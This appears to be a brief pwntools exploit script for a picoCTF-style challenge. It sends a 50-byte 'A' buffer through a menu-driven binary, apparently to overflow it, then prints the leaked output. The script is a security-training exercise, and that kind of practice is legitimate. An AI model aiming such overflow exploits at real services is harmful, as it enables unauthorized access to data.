from pwn import *

ip = 'PICO'
port = 4444

buf = b'A' * 50

#r = remote(ip,port)
r = process('./chall')

r.recvuntil('Enter your choice: ')
r.sendline('2')
r.recvuntil('Data for buffer: ')
r.sendline(buf)
r.recvuntil('Enter your choice: ')

r.sendline('4')
data = r.recv()

print(data[9:])
